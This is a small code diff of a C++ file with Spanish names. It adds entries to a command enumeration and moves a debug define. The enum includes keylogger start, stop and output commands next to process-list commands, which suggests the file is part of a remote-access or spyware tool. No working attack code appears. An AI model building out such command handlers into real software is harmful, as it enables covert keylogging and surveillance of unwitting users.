@@ -32,6 +32,8 @@
 #include "aes256/aes256.hpp"
 
 #define AES_KEY_LEN 32
+#define ___DEBUG_
+#define CMD_DEL '~'
 
 #define error() std::cout<<"Error["<<GetLastError()<<"]\n";
 #define error_2(x) std::cout<<"["<<x<<"]"<<"Error["<<GetLastError()<<"]\n";
@@ -42,7 +44,7 @@ typedef const char c_char;
 typedef unsigned long long int u64;
 
 
-#define ___DEBUG_
+
 
 namespace EnumComandos {
     enum Enum {
@@ -78,7 +80,9 @@ namespace EnumComandos {
         PM_Lista,
         KL_Iniciar,
         KL_Detener,
-        KL_Salida
+        KL_Salida,
+        CM_Lista,
+        CM_Lista_Salida
     };
 }
 
